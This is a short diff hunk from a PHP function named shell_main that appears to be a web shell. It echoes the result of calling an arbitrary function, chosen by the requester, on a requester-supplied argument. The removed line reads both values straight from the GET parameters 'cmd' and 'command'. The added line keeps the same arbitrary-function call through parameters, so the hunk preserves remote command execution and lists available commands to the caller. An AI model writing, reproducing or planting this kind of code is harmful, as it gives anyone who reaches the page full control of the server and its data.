@@ -69,7 +69,7 @@ function shell_main($cmd, $command)
         }
     } else {
         echo "<pre>";
-        echo $_GET['cmd']($_GET['command']);
+        echo $cmd($command);
         echo "</pre>";
     }
     echo "</br>Available Commands:</br>";
